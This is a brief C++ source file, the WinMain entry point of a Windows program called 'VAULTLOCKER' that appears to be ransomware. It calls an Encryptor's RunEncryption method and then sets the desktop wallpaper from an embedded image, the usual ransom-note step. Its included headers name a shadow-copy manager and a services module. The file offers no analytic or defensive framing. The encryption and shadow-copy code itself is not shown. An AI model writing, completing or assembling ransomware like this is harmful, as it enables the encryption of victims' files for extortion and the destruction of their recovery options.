// VAULTLOCKER. 2024
// MAIN.CPP
// MAIN FUNCTION

#include "Encryptor.h"
#include "ShadowCopyManager.h"
#include "resource.h"
#include "Services.h"

// Ensure the WinMain function is properly annotated
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
    Encryptor encryptor;
    encryptor.RunEncryption();

    LPCWSTR resourceName = MAKEINTRESOURCE(MY_IMAGE); // REPLACE 'MY_IMAGE' WITH YOUR RESOURCE ID DEFINED IN RESOURCE.h
    bool result = setDesktopWallpaperFromResource(hInstance, resourceName);

    if (!result) {
        // HANDLE ERROR IF WALLPAPER CHANGE FAILED
        return 1;
    }

    return 0;
}

